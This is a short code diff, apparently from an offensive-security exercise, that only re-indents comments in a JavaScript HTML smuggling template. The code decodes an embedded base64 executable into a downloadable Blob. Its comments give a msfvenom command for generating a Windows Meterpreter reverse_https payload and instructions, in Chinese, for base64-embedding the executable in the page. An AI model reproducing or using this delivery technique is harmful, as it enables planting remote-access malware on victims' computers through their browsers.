@@ -9,10 +9,10 @@
                 return bytes.buffer;
             }
 
-			// sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= -f exe -o /var/www/html/msfstaged.exe
-			// base64 /var/www/html/msfstaged.exe
-			// 在嵌入 Base64 编码的可执行文件之前, 我们必须删除任何换行或新行, 将其嵌入为一个连续的字符串
-			// 或者, 我们可以将每行用引号括起来
+	    // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= -f exe -o /var/www/html/msfstaged.exe
+	    // base64 /var/www/html/msfstaged.exe
+	    // 在嵌入 Base64 编码的可执行文件之前, 我们必须删除任何换行或新行, 将其嵌入为一个连续的字符串
+	    // 或者, 我们可以将每行用引号括起来
             var file = '';
             var data = base64ToArrayBuffer(file);
             var blob = new Blob([data], { type: 'octet/stream' });
